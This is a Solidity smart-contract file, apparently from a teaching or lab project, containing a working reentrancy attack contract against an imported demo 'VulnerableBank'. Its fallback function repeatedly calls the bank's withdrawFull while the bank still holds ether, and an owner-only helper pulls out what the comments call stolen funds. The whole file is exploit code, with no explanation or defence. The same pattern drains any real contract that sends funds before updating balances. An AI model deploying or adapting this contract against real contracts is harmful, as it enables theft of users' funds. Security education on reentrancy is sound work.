// SPDX-License-Identifier: MIT
// Attacker contract to exploit the VulnerableBank
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract ReentrancyAttack {
    VulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    // Receive function to accept Ether transfers
    receive() external payable {}

    // Fallback function executed during Ether reception
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdrawFull();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need to send at least 1 Ether to attack");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdrawPartial(1 ether);
    }

    // Helper function to withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}
